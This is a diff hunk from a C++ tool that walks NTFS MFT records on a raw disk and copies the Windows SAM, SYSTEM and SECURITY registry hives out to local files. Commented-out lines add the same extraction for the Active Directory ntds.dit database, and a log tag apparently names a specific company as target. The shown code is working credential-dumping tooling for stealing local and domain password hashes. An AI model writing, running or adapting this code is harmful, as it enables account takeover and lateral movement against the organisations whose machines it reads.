@@ -850,6 +850,7 @@ int main(int argc, char* argv[]) {
     bool sami = false;
     bool sysi = false;
     bool seci = false;
+    bool ntdi = false;
     vector<BYTE> recBuf((size_t)mft_record_size);
 
     for (int i = 0; i < MAX_ENTRIES; i++) {
@@ -877,35 +878,50 @@ int main(int argc, char* argv[]) {
                 break;
             }
         }
+        //if (i % 10000 == 0 && i > 0) {
+        //    fprintf(stderr, "[AB-InBev] Scanned entry %d, found %d valid entries\n", i, found);
+        //    if (sami && ntdi) {
+        //        printf("\n[+] Yalla Bye!.\n");
+        //        break;
+        //    }
+        //}
 
         found++;
+            //if (info.filename == "ntds.dit" && fullpath == "C:\\Windows\\NTDS\\ntds.dit") {
+            //    printf("\n[MATCH] [%d] %s (%s) | Size: %llu | Path: %s\n",
+            //        i, info.filename.c_str(), type, info.file_size, fullpath.c_str());
+            //    if (ExtractFile(hDisk, (ULONGLONG)i, "ntdi.bin")) {
+            //        printf("[+] NTDS\n");
+            //        ntdi = true;
+            //    }
+            //}
 
-        if (info.filename == "SAM" && fullpath == "C:\\Windows\\System32\\config\\SAM") {
-            printf("\n[MATCH] [%d] %s (%s) | Size: %llu | Path: %s\n",
-                i, info.filename.c_str(), type, info.file_size, fullpath.c_str());
-            if (ExtractFile(hDisk, (ULONGLONG)i, "sami.bin")) {
-                printf("[+] SAM\n");
-                sami = true;
+            if (info.filename == "SYSTEM" && fullpath == "C:\\Windows\\System32\\config\\SYSTEM") {
+                printf("\n[MATCH] [%d] %s (%s) | Size: %llu | Path: %s\n",
+                    i, info.filename.c_str(), type, info.file_size, fullpath.c_str());
+                if (ExtractFile(hDisk, (ULONGLONG)i, "sysi.bin")) {
+                    printf("[+] SYSTEM\n");
+                    sysi = true;
+                }
             }
-        }
 
-        if (info.filename == "SYSTEM" && fullpath == "C:\\Windows\\System32\\config\\SYSTEM") {
-            printf("\n[MATCH] [%d] %s (%s) | Size: %llu | Path: %s\n",
-                i, info.filename.c_str(), type, info.file_size, fullpath.c_str());
-            if (ExtractFile(hDisk, (ULONGLONG)i, "sysi.bin")) {
-                printf("[+] SYSTEM\n");
-                sysi = true;
+            if (info.filename == "SAM" && fullpath == "C:\\Windows\\System32\\config\\SAM") {
+                printf("\n[MATCH] [%d] %s (%s) | Size: %llu | Path: %s\n",
+                    i, info.filename.c_str(), type, info.file_size, fullpath.c_str());
+                if (ExtractFile(hDisk, (ULONGLONG)i, "sami.bin")) {
+                    printf("[+] SAM\n");
+                    sami = true;
+                }
             }
-        }
 
-        if (info.filename == "SECURITY" && fullpath == "C:\\Windows\\System32\\config\\SECURITY") {
-            printf("\n[MATCH] [%d] %s (%s) | Size: %llu | Path: %s\n",
-                i, info.filename.c_str(), type, info.file_size, fullpath.c_str());
-            if (ExtractFile(hDisk, (ULONGLONG)i, "seci.bin")) {
-                printf("[+] SECURITY\n");
-                seci = true;
+            if (info.filename == "SECURITY" && fullpath == "C:\\Windows\\System32\\config\\SECURITY") {
+                printf("\n[MATCH] [%d] %s (%s) | Size: %llu | Path: %s\n",
+                    i, info.filename.c_str(), type, info.file_size, fullpath.c_str());
+                if (ExtractFile(hDisk, (ULONGLONG)i, "seci.bin")) {
+                    printf("[+] SECURITY\n");
+                    seci = true;
+                }
             }
-        }
     }
 
 
